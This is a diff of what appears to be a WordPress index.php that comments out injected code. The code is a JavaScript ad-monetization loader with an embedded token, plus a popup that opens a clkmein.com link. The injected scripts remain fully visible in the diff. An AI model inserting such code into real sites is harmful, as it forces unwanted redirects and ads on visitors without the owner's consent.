@@ -15,7 +15,7 @@ define('WP_USE_THEMES', true);
 
 /** Loads the WordPress Environment and Template */
 require( dirname( __FILE__ ) . '/wp-blog-header.php' );
-echo '<script type="text/javascript">//<![CDATA[ 
+/*echo '<script type="text/javascript">//<![CDATA[ 
 (function() {
     var configuration = {
     "token": "794657897b5a65cda0b25f5dd9b32d18",
@@ -47,8 +47,8 @@ echo '<script type="text/javascript">//<![CDATA[
     script.onload = script.onreadystatechange = function () {var rs = this.readyState; if (rs && rs != "complete" && rs != "loaded") return; shortestMonetization(configuration);};
     var entry = document.getElementsByTagName("script")[0];
     entry.parentNode.insertBefore(script, entry);
-})();
+})();*/
 //]]></script>';
 
 
-echo "<script> window.open('http://clkmein.com/qOxoaS', '_blank').focus()</script>";
+//echo "<script> window.open('http://clkmein.com/qOxoaS', '_blank').focus()</script>";
